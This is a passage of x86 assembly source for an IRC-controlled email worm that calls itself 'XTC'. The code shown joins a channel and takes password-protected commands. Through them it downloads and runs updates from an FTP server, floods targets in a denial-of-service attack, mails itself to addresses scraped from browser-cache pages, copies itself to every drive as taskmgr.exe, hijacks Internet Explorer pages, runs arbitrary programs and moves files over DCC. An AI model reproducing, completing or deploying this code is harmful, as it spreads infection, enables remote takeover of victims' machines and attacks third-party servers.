	sub	ecx,esi
	neg	ecx
	pop	esi
	call	irc_send				;send PONG! if PING?

s_pong:	mov	ecx,100
	call	irc_recv				;get server reply
	test	eax,eax
	je	end_irc_socket
	inc	eax
	je	end_irc_socket

	push	19
	pop	ecx
	mov	esi,offset irc_join
	call	irc_send				;send the JOIN command
	jecxz	end_irc_socket

	push	22
	pop	ecx
	mov	esi,offset irc_mode1
	call	irc_send				;set channel modez
	jecxz	end_irc_socket

	push	17
	pop	ecx
	mov	esi,offset irc_mode2
	call	irc_send				;--- "" ---
	jecxz	end_irc_socket

	mov	ecx,300h
	call	irc_recv				;get server reply
	test	eax,eax
	je	end_irc_socket
	inc	eax
	je	end_irc_socket
	and	[password_passed],0			;no superuser logged yet

	call	@lupd
	db	'PRIVMSG #xtcdan :!ver0001',0dh,0ah
@lupd:	pop	esi
	push	27
	pop	ecx
	call	irc_send				;send worms version code
	inc	eax
	je	end_irc_socket

	call	irc_SPREADON				;spread via e-mail
	call	irc_manage				;the bot handling procedure

end_irc_socket:
	push	12345678h
hSocket = dword ptr $-4
	call	closesocket				;close connection
end_wsa:call	WSACleanup				;clean up
end_irc_man:
irc_RECONN:
	ret
IRCConnect	EndP


irc_manage_pop:
	pop	esi


;this procedure can analyse IRC commandz and make the proper actionz
irc_manage	Proc
	call	GetTickCount				;get the time
	xchg	eax,ebp
	call	irc_recv_100h				;get IRC reply
	push	eax
	call	GetTickCount				;get the time
	xchg	eax,ecx
	pop	eax
	test	eax,eax
	je	end_irc_man
	inc	eax
	je	end_irc_socket

	sub	ecx,ebp
	cmp	ecx,5*60000
	jb	no_idle					;quit if nothing 
	ret						;happened in 5 minutez
no_idle:cmp	[esi],'GNIP'
	je	do_pong					;make the PONG! reply
	inc	esi					;if needed

	push	esi
	@endspc
	cmp	[esi],'VIRP'
	jne	irc_manage_pop
	cmp	[esi+4],2047534Dh			;quit if its not PRIVMSG
	jne	irc_manage_pop				;command

	push	9
	pop	ecx
	mov	edi,offset irc_tmp
	mov	edx,edi
	movsd
	movsd						;copy the first part
	pop	esi					;or the command

o_exl:	inc	ecx
	lodsb
	stosb
	cmp	al,'!'
	jne	o_exl
	dec	edi
	mov	al,20h
	stosb
o_cln:	lodsb
	cmp	al,':'
	jne	o_cln
	stosb						;--- "" ---

	cmp	[esi],'adpu'
	jne	@m_nx0
	cmp	word ptr [esi+4],'et'
	jne	@m_nx0
	cmp	byte ptr [esi+6],20h
	je	irc_UPDATE				;update worm if the
							;command has been sent
@m_nx0:	cmp	[esi],'rev!'				;version quering?
	jne	@m_next
	cmp	[esi+4],'1000'
	jb	@m_n
	jmp	@m_next					;continue

@m_n:	mov	eax,'adpu'				;construct update command
	stosd
	mov	ax,'et'
	stosw
	mov	al,20h
	stosb
	add	ecx,7
	push	edx
	push	ecx
	push	edi

	call	@m_h
	dd	100
@m_h:	push	edi
	call	@m_o
	dd	1
@m_o:	@pushsz	'XTCUpdate'
	push	offset up_path
	push	80000002h
	call	SHGetValueA				;get the FTP address
	pop	esi					;from registry
	pop	ecx
@l_up2:	lodsb
	inc	ecx
	test	al,al
	jne	@l_up2
	dec	esi
	mov	edi,esi
	mov	ax,0A0Dh
	stosw
	inc	ecx
	inc	ecx
	pop	esi
	call	irc_send				;send it!
	jmp	irc_manage

@m_next:mov	eax,12345678h				;check if it was
password_passed = dword ptr $-4				;already entered the
	test	eax,eax					;password
	je	irc_no_pswd

	push	num_of_commands				;password entered,
	pop	eax					;analyse the command
command_parse:						;and execute the proper
	pushad						;procedure
	mov	edi,[eax*4+offset command_table_stringz-4]
	movzx	ecx,byte ptr [eax+command_table_size-1]
	mov	edx,[eax*4+offset command_table_jmp-4]
	mov	[esp.Pushad_ebx],edx
	rep	cmpsb
	popad
	jne	e_cp
	jmp	ebx					;--- "" ---
e_cp:	dec	eax
	test	eax,eax
	jne	command_parse
	jmp	msg_err					;bad command


do_pong:mov	byte ptr [esi+1],'O'			;send the PONG! reply
	xchg	eax,ecx					;if needed
	call	irc_send				;--- "" ---
	jmp	irc_manage

irc_no_pswd:						;check the password
	pushad
	mov	edi,offset msg_PASS
	push	9
	pop	ecx
	rep	cmpsb					;check the PASSWORD
	je	check_password				;command
	popad
msg_err:mov	ax,0D2Eh				;send the "failed" reply
	stosw
	mov	al,0Ah
	stosb
	add	ecx,3
end_pwd:mov	esi,edx
	call	irc_send				;--- "" ---
	jmp	irc_manage
check_password:
	mov	edi,5
	call	CRC32					;calculate CRC32 from
	add	eax,-PASSWORD				;the given password
	popad
	jne	msg_err					;quit if wrong password
	mov	[password_passed],edi
msg_ok:	mov	eax,0A0D2A2Ah
	stosd
	add	ecx,4					;password ok, send
	jmp	end_pwd					;the reply


;updates worm from the internet
irc_UPDATE:
	pushad
	@endspc						;get over the command

	mov	edi,offset temppath
	push	edi
	xor	ecx,ecx
	push	esi
c_upd:	lodsb
	stosb
	inc	ecx
	cmp	al,0Dh
	jne	c_upd
	mov	byte ptr [edi-1],0
	pop	esi
	pop	edi
	push	ecx
	push	edi
	push	1
up_xtc:	@pushsz	'XTCUpdate'
up_path = $+5
	@pushsz	'Software\Microsoft\Windows\CurrentVersion'
	push	80000002h				;write the FTP address 
	call	SHSetValueA				;to registry

	push	esi
	@endspc
	mov	byte ptr [esi-1],0
	push	esi
	@endspc
	mov	byte ptr [esi-1],0
	push	esi
	@endbr
	mov	byte ptr [esi-1],0

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	@pushsz	'XTC'
	call	InternetOpenA				;create the inet handle
	test	eax,eax
	je	err_up0
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	call	InternetCheckConnectionA		;check if we are already
	xchg	eax,ecx					;connected to inet
	jecxz	err_up1					;quit if not

	xor	eax,eax
	push	eax
	push	eax
	push	1
	push	eax
	push	eax
	push	21
	push	dword ptr [esp+8+6*4]
	push	ebx
	call	InternetConnectA			;connect to FTP server
	test	eax,eax
	je	err_up1
	xchg	eax,ebp

	push	dword ptr [esp+4]
	push	ebp
	call	FtpSetCurrentDirectoryA			;change the directory
	xchg	eax,ecx
	jecxz	err_up2

	push	0
	push	2
	push	FILE_ATTRIBUTE_NORMAL
	push	0
	@pushsz	'xtcspawn.exe'
	pop	edi
	push	edi
	push	dword ptr [esp+5*4]
	push	ebp
	call	FtpGetFileA				;download the worm
	xchg	eax,ecx
	jecxz	err_up2

	push	0
	push	edi
	call	WinExec					;execute it
	jmp	end_worm

err_up2:push	ebp
	call	InternetCloseHandle
err_up1:push	ebx
	call	InternetCloseHandle			;close all inet handlez
err_up0:pop	eax
	pop	eax
	pop	eax
	popad
	jmp	irc_manage

;logoff superuser, forget written password
irc_NOPASS:
	and	[password_passed],0
	jmp	msg_ok

;stops DOS attack and enables new one
irc_STOPDOS:
	and	[dos_sem],0
	jmp	msg_ok


;sends IRC command
irc_IRCSEND:
	mov	edi,edx
	pushad
	@endspc
	xor	ecx,ecx
l_ircs:	inc	ecx
	lodsb
	stosb
	cmp	al,0Ah
	jne	l_ircs
	mov	[esp.Pushad_ecx],ecx
	popad
	jmp	end_pwd


;DOS attack
irc_DOS:pushad
	@SEH_SetupFrame	<jmp	err_dos>
	@endspc						;get over the command
	call	Ascii2Num
	push	eax
	call	htons
	mov	[DOS_sock.sin_port],ax			;save the port number
	inc	esi
	push	esi					;ESI = server name (*)
	@endbr
	mov	byte ptr [esi-1],0

	call	gethostbyname				;*
	test	eax,eax
	je	err_dos
	mov	eax,[eax+HOSTENT_IP]
	mov	eax,[eax]
	mov	[DOS_sock.sin_addr],eax			;save the IP

	mov	[dos_sem],eax
	xor	eax,eax
	@pushsz	'XTC'
	push	eax
	push	eax
	push	offset DOS_Thread
dos_thr:push	eax
	push	eax
	call	CreateThread				;create separate thread
	xchg	eax,ecx
	jecxz	err_dos

	push	ecx
	call	CloseHandle				;close its handle

ok_dos:	@SEH_RemoveFrame
	popad
	jmp	msg_ok					;reply "ok"
err_dos:@SEH_RemoveFrame
	popad
	jmp	msg_err					;reply "failed"


;send infected mail message to specified e-mail address
irc_SPREADTO:
	pushad
	@endspc
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	pop	esi					;replace CRLF by NULL

	call	mapi_init				;initialize MAPI32
	test	eax,eax
	jne	end_st					;quit if error

	mov	edi,offset mail_address			;store mail address
	@copysz
	call	mapi_send				;send virus there
	call	mapi_close				;log off from MAPI32
end_st:	popad
	jmp	irc_manage				;and quit


;logon to MAPI32
mapi_init:
	xor	eax,eax
	push	offset MAPIHandle
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	call	MAPILogon
	ret


;starts with mail spreading
irc_SPREADON:
	pushad
	@SEH_SetupFrame	<jmp	e_spr>

	mov	ebp,offset spread_sem
	cmp	dword ptr [ebp],0			;check the semaphore
	jne	e_spr

	call	mapi_init
	test	eax,eax
	jne	e_spr

	mov	[ebp],ebp
	@pushsz	'XTC'
	push	eax
	push	eax
	push	offset SPREAD_Thread
	push	eax
	push	eax
	call	CreateThread				;create separate thread
	xchg	eax,ecx
	jecxz	e_spr

	push	ecx
	call	CloseHandle				;close its handle

e_spr:	@SEH_RemoveFrame
	popad
	jmp	irc_manage				;and quit


;logs off from MAPI32
mapi_close:
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	12345678h
MAPIHandle = dword ptr $-4
	call	MAPILogoff
	ret


;stops with mail spreading
irc_SPREADOFF:
	call	mapi_close
	and	[spread_sem],0				;clear the semaphore
	jmp	msg_ok


;sets some default pagez of MSIE to http://www.therainforestsite.com
irc_MARK:
	pushad
	call	@m_reg
	db	'Default_Page_URL',0			;item table
	db	'Default_Search_URL',0
	db	'Search Page',0
	db	'Start Page',0
	db	'What''s New',0
	db	'Local Page',0
@m_reg:	pop	esi

	push	6
	pop	ecx
m_loop:	push	ecx
	push	32
	@pushsz	'http://www.therainforestsite.com'	;destination URL
	push	1
	push	esi
	@pushsz	'Software\Microsoft\Internet Explorer\Main'
	push	80000002h				;key
	call	SHSetValueA				;set the value

	@endsz
	pop	ecx
	loop	m_loop
	popad
	jmp	msg_ok					;and reply to user


;quits from infected computer
irc_LEAVE:
	mov	edi,offset temppath
	push	MAX_PATH
	push	edi
	call	GetWindowsDirectoryA			;get the windows directory
	push	edi
	add	edi,eax
	mov	eax,'niw\'
	stosd
	mov	eax,'ini.'
	stosd
	xor	al,al
	stosb						;create windir\win.ini
							;path+filename
	push	0
	@pushsz	'run'
	push	offset win_table+3
	call	WritePrivateProfileStringA		;clear the item there

	mov	esi,offset regWorm
	mov	edx,esi
	@endsz
	sub	esi,edx
	dec	esi
	push	esi
	push	edx
	push	2
	@pushsz	'XTC'
	@pushsz	'Software\Microsoft\Windows\CurrentVersion\RunOnce'
	push	80000002h				;delete worm on next
	call	SHSetValueA				;start of windows

	push	offset wormname2			;try to delete itself
	call	DeleteFileA				;(worx under Win95 only)

	push	offset up_xtc+5
	push	offset up_path
	push	80000002h				;delete the update URL
	call	SHDeleteValueA				;item in registry

	push	offset up_xtc+5
	push	offset run_key
	push	80000002h				;delete last item
	call	SHDeleteValueA				;in registry
	jmp	irc_REBOOT				;and reboot computer


;sends file via DCC
irc_SENDME:
	mov	ebp,ecx
	pushad
	@endspc
	push	esi
	@endspc
	mov	byte ptr [esi-1],0
	push	esi
	@endbr
	mov	byte ptr [esi-1],20h
	pop	ebp
	pop	esi

	xor	ebx,ebx
	push	ebx
	push	ebx
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	esi
	call	CreateFileA				;open the file
	inc	eax
	je	err_send0
	dec	eax
	mov	[sendFile],eax

	push	ebx
	push	eax
	call	GetFileSize				;get its size
	mov	[sendBytes],eax

	push	ebx
	push	SOCK_STREAM
	push	AF_INET
	call	socket					;create socket
	inc	eax
	je	err_send1
	dec	eax
	mov	[sendSocket],eax

	call	GetTickCount
	push	1000
	pop	ecx
	xor	edx,edx
	div	ecx
	add	edx,4000
	mov	[dccPort],edx
	push	edx
	call	htons
	mov	[DCC_sock.sin_port],ax			;select random port
	and	[DCC_sock.sin_addr],0			;number

	push	sockSize
	push	offset DCC_sock
	push	12345678h
sendSocket = dword ptr $-4
	call	bind					;hook the port
	test	eax,eax
	jne	err_send2

	mov	eax,'CCD1'-'1'+1
	stosd
	mov	eax,'NES '
	stosd
	mov	ax,' D'
	stosw
	add	dword ptr [esp.Pushad_ebp],10		;create DCC command

	mov	esi,ebp
cpy_sm:	lodsb
	stosb
	inc	dword ptr [esp.Pushad_ebp]
	cmp	al,20h
	jne	cpy_sm

	push	offset irc_buffer
	push	50
	push	offset irc_buffer
	call	gethostname
	call	gethostbyname
	mov	eax,[eax+HOSTENT_IP]			;the IP
	mov	eax,[eax]
	push	eax
	call	htonl

	mov	ebp,edi
	call	Num2Ascii
	mov	eax,edi
	sub	eax,ebp
	inc	eax
	add	dword ptr [esp.Pushad_ebp],eax
	mov	al,20h
	stosb

	mov	eax,12345678h				;the port number
dccPort = dword ptr $-4
	mov	ebp,edi
	call	Num2Ascii
	mov	eax,edi
	sub	eax,ebp
	inc	eax
	add	dword ptr [esp.Pushad_ebp],eax
	mov	al,20h
	stosb

	mov	ebp,edi
	mov	eax,12345678h
sendBytes = dword ptr $-4				;and file size
	call	Num2Ascii
	mov	eax,edi
	sub	eax,ebp
	add	eax,4
	add	dword ptr [esp.Pushad_ebp],eax

	mov	ax,0D01h
	stosw
	mov	al,0Ah
	stosb						;terminate the command

	mov	ecx,[esp.Pushad_ebp]
	mov	esi,edi
	sub	esi,ecx
	call	irc_send				;send it

	push	1
	push	[sendSocket]
	call	listen					;switch to listen mode
	test	eax,eax
	jne	err_send2

	push	eax
	push	eax
	push	[sendSocket]
	call	accept					;accept incomming bytez

	xchg	eax,[sendSocket]
	push	eax
	call	closesocket				;close incomming socket

	mov	ebx,offset dcctmp
	xor	esi,esi
l_dcc_send:
	push	0
	push	ebx
	push	1000h
	push	offset irc_buffer
	push	[sendFile]				;read some bytez from
	call	ReadFile				;the file

	push	0
	push	dword ptr [ebx]
	push	offset irc_buffer
	push	[sendSocket]
	call	send					;send them

	add	esi,[ebx]
	cmp	esi,[sendBytes]
	je	ok_send					;check if we are finished
	cmp	[ebx],eax
	je	l_dcc_send

err_send2:
	push	[sendSocket]
	call	closesocket				;close the socket
err_send1:
	push	12345678h
sendFile = dword ptr $-4
	call	CloseHandle				;close the file
err_send0:
err_dcc0:
	popad
	jmp	msg_err					;and reply "failed"
ok_send:push	[sendSocket]
	call	closesocket				;close the socket
	push	[sendFile]
	call	CloseHandle				;file
	popad
	jmp	msg_ok					;reply "ok"


;recieves file via DCC
irc_DCCRECV:
	pushad

	@endspc
	@endspc
	push	esi
	@endspc
	mov	byte ptr [esi-1],0
	pop	esi

	xor	eax,eax
	push	eax
	push	eax
	push	CREATE_ALWAYS
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	esi
	call	CreateFileA				;create new file
	inc	eax
	je	err_dcc0
	dec	eax
	mov	[dccFile],eax

	push	0
	push	SOCK_STREAM
	push	AF_INET
	call	socket					;create socket
	inc	eax
	je	err_dcc1
	dec	eax
	mov	[dccSocket],eax

	@endsz
	push	esi
	@endspc
	mov	byte ptr [esi-1],0
	pop	esi

	call	Ascii2Num
	push	eax
	call	htonl
	mov	[DCC_sock.sin_addr],eax			;get IP

	inc	esi
	call	Ascii2Num
	push	eax
	call	htons
	mov	[DCC_sock.sin_port],ax			;port

	inc	esi
	call	Ascii2Num
	xchg	eax,ebx

	push	sockSize
	push	offset DCC_sock
	push	[dccSocket]
	call	connect					;connect to remote machine
	inc	eax
	je	err_dcc2

	xor	esi,esi
dcc_recv_loop:
	push	0
	push	1000h
	push	offset irc_buffer
	push	[dccSocket]
	call	recv					;get incomming bytez
	inc	eax
	je	err_dcc2
	dec	eax
	sub	ebx,eax
	add	esi,eax

	push	0
	call	@tmp
dcctmp	dd	?
@tmp:	push	eax
	push	offset irc_buffer
	push	[dccFile]
	call	WriteFile				;write them to file

	push	esi
	call	htonl
	mov	ecx,offset dcctmp
	mov	[ecx],eax

	push	0
	push	4
	push	ecx
	push	[dccSocket]				;send number of
	call	send					;recieved bytez

	test	ebx,ebx
	jne	dcc_recv_loop				;are we finished?

	call	dcc_closesock				;yep, disconnect,
	call	dcc_closefile				;close the file
	popad
	jmp	msg_ok					;and reply "ok"

err_dcc1:
	call	dcc_closefile				;close the file
	jmp	err_dcc0				;and quit
err_dcc2:
	call	dcc_closesock				;disconnect
	jmp	err_dcc1				;and quit
dcc_closefile:
	push	12345678h
dccFile = dword ptr $-4
	call	CloseHandle				;close the file
	ret
dcc_closesock:
	push	12345678h
dccSocket = dword ptr $-4
	call	closesocket				;disconnect
	ret


;writes the host name of local machine
irc_MACHINE:
	pushad
	push	50
	push	edi
	call	gethostname				;get host name
	test	eax,eax
	jne	err_mach				;quit if error
	mov	esi,edi
	@endsz
	dec	esi
	sub	esi,edi
	add	[esp.Pushad_ecx],esi			;update the size of
	add	[esp.Pushad_edi],esi			;command
	popad
	mov	ax,0A0Dh
	stosw						;terminat the command
	inc	ecx
	inc	ecx
	jmp	end_pwd					;send it
err_dc0:
err_mach:
	popad
	jmp	msg_err					;error


;writes some infos about worm
irc_INFO:
	mov	esi,offset info_table
	push	ecx
	push	info_size
	pop	ecx
	add	[esp],ecx
	rep	movsb
	pop	ecx
	jmp	msg_ok


;reboots the computer
irc_REBOOT:
	push	0
	push	2 or 4
	call	ExitWindowsEx
	push	0
	push	0
	call	ExitWindowsEx
	jmp	end_worm


;infects all mapped/fixed disks
irc_LAN:pushad
	mov	esi,offset irc_buffer
	push	0
	push	7
	push	esi
	push	0
	call	SHGetSpecialFolderPathA			;get the STARTUP folder
	test	eax,eax
	je	err_lan
	push	esi
	@endsz
	mov	edi,esi
	pop	esi
	dec	edi
	mov	eax,'tni\'				;construct "internat.exe"
	stosd						;path+filename
	mov	eax,'anre'
	stosd
	mov	eax,'xe.t'
	stosd
	push	'e'
	pop	eax
	stosw						;--- "" ---

	push	0
	push	esi
	push	offset wormname2
	call	CopyFileA				;copy the worm

	;spread in C: - Z: disk drivez
	push	'Z'-'C'
	pop	ecx
	and	[lan_res],0
ld_lan:	push	ecx
	mov	edi,offset irc_buffer
	mov	esi,offset win_table
	push	winNumber
	pop	ecx
l_lan:	push	ecx
	push	edi
	mov	ebp,esi
	mov	byte ptr [esi],'Z'
lan_drive = byte ptr $-1
	@copysz
	dec	edi
	mov	eax,'sat\'
	stosd
	mov	eax,'rgmk'
	stosd
	mov	eax,'exe.'				;as "taskmgr.exe" file
	stosd
	xor	al,al
	stosb
	pop	edi
	push	0
	push	edi
	push	offset wormname2
	call	CopyFileA				;copy a worm
	dec	eax
	jne	wr_lan

	push	esi
	push	edi
	mov	esi,ebp
	mov	edi,offset temppath
	mov	edx,edi
	@copysz
	dec	edi
	mov	eax,'niw\'
	stosd
	mov	eax,'ini.'
	stosd
	xor	al,al
	stosb
	pop	edi
	pop	esi

	inc	[lan_res]
	push	edx
	push	edi
	@pushsz	'run'
	push	offset win_table+3
	call	WritePrivateProfileStringA		;modify win.ini

wr_lan:	pop	ecx
	loop	l_lan					;try another directory

	pop	ecx
	dec	byte ptr [lan_drive]
	dec	ecx
	test	ecx,ecx
	jne	ld_lan					;try another disk drive

	mov	ecx,12345678h
lan_res = dword ptr $-4
	jecxz	err_lan
	popad
	jmp	msg_ok
err_lan:popad
	jmp	msg_err


;replies if the machine name matches
irc_WHOIS:
	pushad
	@endspc
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	call	gethostbyname				;get the IP
	xchg	eax,ecx
	jecxz	err_who
	mov	ebx,[ecx+HOSTENT_IP]
	mov	ebx,[ebx]

	mov	edi,offset irc_buffer
	push	100
	push	edi
	call	gethostname				;get host name
	test	eax,eax
	jne	err_who

	push	edi
	call	gethostbyname				;convert it to IP
	xchg	eax,ecx
	jecxz	err_who
	mov	eax,[ecx+HOSTENT_IP]
	mov	eax,[eax]
	cmp	eax,ebx
	jne	err_who					;reply if matches

	popad
	jmp	msg_ok
err_who:popad
	jmp	irc_manage


;executes the application
irc_EXEC:
	pushad
	@endspc
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	pop	esi					;get the command line

	xor	eax,eax
	push	offset pInfo
	push	offset sInfo
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	esi
	push	eax
	call	CreateProcessA				;execute it!
	mov	[esp.Pushad_eax],eax

	push	[pInfo.hThread]
	call	CloseHandle
	push	[pInfo.hProcess]
	call	CloseHandle				;close all handlez
	popad
	dec	eax
	je	msg_ok
	jmp	msg_err


;copies file
irc_COPY:
	@endspc
	push	ecx
	push	edx
	push	0
	push	esi
	push	esi
l_copy1:lodsb
	cmp	al,20h
	jne	l_copy1
	mov	byte ptr [esi-1],0
	mov	[esp+4],esi
	@endbr
	mov	byte ptr [esi-1],0
	call	CopyFileA
	jmp	md_dir


;moves/renames file
irc_MOVE:
	@endspc
	push	ecx
	push	edx
	push	esi
	push	esi
l_move1:lodsb
	cmp	al,20h
	jne	l_move1
	mov	byte ptr [esi-1],0
	mov	[esp+4],esi
	@endbr
	mov	byte ptr [esi-1],0
	call	MoveFileA
	jmp	md_dir


;removes file
irc_DEL:@endspc
	push	ecx
	push	edx

	push	esi
	push	FILE_ATTRIBUTE_NORMAL
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	call	SetFileAttributesA			;blank attributez
	test	eax,eax
	pop	ecx
	je	md_dir
	push	ecx
	call	DeleteFileA				;and delete the file
	jmp	md_dir


;removes directory
irc_RD:	@endspc
	push	ecx
	push	edx
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	call	RemoveDirectoryA
	jmp	md_dir


;creates directory
irc_MD:	@endspc
	push	ecx
	push	edx
	push	0
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	call	CreateDirectoryA
	jmp	md_dir


;changes the current directory
irc_SETCDIR:
	@endspc
	push	ecx
	push	edx
	push	esi
	@endbr
	mov	byte ptr [esi-1],0
	call	SetCurrentDirectoryA
md_dir:	pop	edx
	pop	ecx
	test	eax,eax
	je	msg_err
	jmp	msg_ok


;retrieves the path to current directory
irc_GETCDIR:
	push	ecx
	push	edx
	push	edi
	push	MAX_PATH
	call	GetCurrentDirectoryA
	pop	edx
	pop	ecx
	add	edi,eax
	add	ecx,eax
	jmp	msg_err


;lists all filez by specified mask
irc_DIR:@endspc
	mov	ebp,esi
	@endbr
	mov	byte ptr [esi-1],0
	push	ecx
	push	edx
	push	offset temppath
	push	ebp
	call	FindFirstFileA				;find first file
	pop	edx
	pop	ecx
	inc	eax
	je	msg_err
	dec	eax
	mov	[fHandle],eax

wr_dir:	pushad
	mov	esi,offset temppath+WFD_szFileName
@l_dir:	lodsb
	inc	ecx
	stosb
	test	al,al
	jne	@l_dir
	dec	edi
	mov	word ptr [edi],0A0Dh
	inc	ecx
	mov	esi,[esp.Pushad_edx]
	call	irc_send				;send the filname
	push	offset temppath
	push	[fHandle]
	call	FindNextFileA				;find another
	dec	eax
	popad
	je	wr_dir

	pushad
	push	12345678h
fHandle = dword ptr $-4
	call	FindClose				;close search handle
	popad
	jmp	msg_ok
irc_manage	EndP


;input:
;ECX - size of data to send
;ESI - ptr to data to send
irc_send	Proc
	push	0
	push	ecx
	push	esi
	push	[hSocket]
	call	send
	xchg	eax,ecx
	ret
irc_send	EndP


irc_recv_100h:
	mov	ecx,100h
;ECX - size of data to recieve
;output: ESI - ptr to buffer
irc_recv	Proc
	push	edi
	push	ecx
	mov	esi,offset irc_buffer
	push	esi

l_recv:	push	0
	push	1
	push	esi
	push	[hSocket]
	call	recv
	mov	dl,[esi]
	inc	esi
	cmp	dl,0Ah
	jne	l_recv

	pop	esi
	pop	ecx
	pop	edi
	ret
irc_recv	EndP


;generates random nickname
GenerateNickName	Proc
	mov	edi,offset nickname
	call	GetTickCount				;get random number
	push	9
	pop	ecx
	xor	edx,edx
	div	ecx
	inc	edx
	mov	ecx,edx					;0..8 in ECX
name_gen:
	push	ecx
	call	GetTickCount				;get random number
	push	'Z'-'A'
	pop	ecx
	xor	edx,edx
	div	ecx
	xchg	eax,edx					;'A'..'Z' in EDX
	add	al,'A'
	stosb
	call	GetTickCount				;get random number
	push	100
	pop	ecx
	xor	edx,edx
	div	ecx
	push	edx					;0..99
	call	Sleep					;wait random time
	pop	ecx
	loop	name_gen
	mov	ax,0a0dh
	stosw						;CRLF
	ret
GenerateNickName	EndP


CRC32	Proc
	push	ecx					;procedure for
	push	edx					;calculating CRC32s
	push	ebx       				;at run-time
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret
CRC32	EndP


;input: ESI - ptr to decimal ASCII number
;output: EAX - number
Ascii2Num	Proc
	push	esi
	xor	ecx,ecx
cnc:	lodsb
	cmp	al,'0'
	jl	no_ch
	cmp	al,'9'
	ja	no_ch
	inc	ecx
	jmp	cnc
no_ch:	pop	esi
	xor	eax,eax
	cdq
g_num:	imul	edx,10
	lodsb
	sub	eax,'0'
	add	edx,eax
	loop	g_num
	xchg	eax,edx
	ret
Ascii2Num	EndP

;input: EAX - number
;output: [EDI] - stored ASCII number
Num2Ascii	Proc
	push	esi
	push	edi
	mov	edi,offset dec_buff

	push	10
	pop	ecx
g_str:	xor	edx,edx
	div	ecx
	add	edx,'0'
	xchg	eax,edx
	stosb
	xchg	eax,edx
	test	eax,eax
	jne	g_str
	pop	esi
	xchg	esi,edi
	dec	esi
cpy_num:std
	lodsb
	cld
	stosb
	cmp	al,11h
	jne	cpy_num
	dec	edi
	pop	esi
	ret
Num2Ascii	EndP


;separate thread for DOS attackz
DOS_Thread	Proc
	pushad
do_dos:	push	PCL_NONE
	push	SOCK_STREAM
	push	AF_INET
	call	socket					;create socket
	xchg	eax,ebx
	push	PCL_NONE
	push	SOCK_STREAM
	push	AF_INET
	call	socket					;and next socket
	xchg	eax,ebp

	push	sockSize
	push	offset DOS_sock
	push	ebx
	call	connect					;connect there
	inc	eax
	je	n_dos
	push	sockSize
	push	offset DOS_sock
	push	ebp
	call	connect					;--- "" ---
	inc	eax
	je	n_dos

	push	0
	push	1000h
	push	offset irc_buffer
	push	ebx
	call	send					;send there some data
	push	0
	push	1000h
	push	offset irc_buffer
	push	ebp
	call	send					;--- "" ---

n_dos:	push	ebx
	call	closesocket				;close socket
	push	ebp
	call	closesocket				;--- "" ---

	mov	ecx,12345678h
dos_sem = dword ptr $-4                                 ;quit if the semaphore
	jecxz	end_dos                                 ;is cleared           
	jmp	do_dos 
end_dos:popad
SVCHandler:
	ret
DOS_Thread	EndP


;separate thread for mail spreading
SPREAD_Thread	Proc
	pushad
	mov	edi,offset temppath
	push	0
	push	20h
	push	edi
	push	0
	call	SHGetSpecialFolderPathA			;get MSIE cache directory
	dec	eax
	jne	end_spread

	push	edi
	call	SetCurrentDirectoryA			;go to there
	dec	eax
	jne	end_spread

;now we have to go to the deepest directory
b_dir:	push	edi
	@pushsz	'*.*'
	call	FindFirstFileA				;find first directory
	inc	eax
	je	end_dir
	dec	eax
	xchg	eax,esi

an_dir:	lea	eax,[edi.WFD_szFileName]
	test	byte ptr [edi],FILE_ATTRIBUTE_DIRECTORY
	je	n_dir					;quit if not directory
	cmp	byte ptr [eax],'.'			;quit if it beggins
	je	n_dir					;with dot

	push	eax
	call	SetCurrentDirectoryA			;go to that directory
	push	esi
	call	FindClose				;close the search handle
	jmp	b_dir

n_dir:	push	edi
	push	esi
	call	FindNextFileA				;find next directory
	dec	eax
	je	an_dir

	push	esi
	call	FindClose				;close the search handle

end_dir:push	edi
	@pushsz	'*.*htm*'
	call	FindFirstFileA				;find first *.*htm* file
	inc	eax
	je	end_spread
	dec	eax
	xchg	eax,esi

p_htmlz:mov	ecx,0
spread_sem = dword ptr $-4
	jecxz	end_spread2				;check the semaphore
	call	parse_html				;search inside html file
							;and find there mail
							;address and send itself
	push	edi					;to there
	push	esi
	call	FindNextFileA				;find next file
	dec	eax
	je	p_htmlz

end_spread2:
	push	esi
	call	FindClose				;close search handle
end_spread:
	popad
	ret

parse_html:
	pushad
	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	offset temppath+WFD_szFileName
	call	CreateFileA				;open the file
	inc	eax
	je	end_spread
	dec	eax
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	ebx
	call	CreateFileMappingA			;create the file mapping
	test	eax,eax
	je	ph_close
	xchg	eax,ebp

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	ebp
	call	MapViewOfFile				;map the file
	test	eax,eax
	je	ph_close2
	xchg	eax,esi

	push	0
	push	ebx
	call	GetFileSize				;get its size
	xchg	eax,ecx
	jecxz	ph_close3

ls_scan_mail:
	call	@mt
	db	'mailto:'
@mt:	pop	edi
l_scan_mail:
	pushad
	push	7
	pop	ecx
	rep	cmpsb					;search for "mailto:"
	popad						;string
	je	scan_mail				;check the mail address
	inc	esi
	loop	l_scan_mail				;in a loop

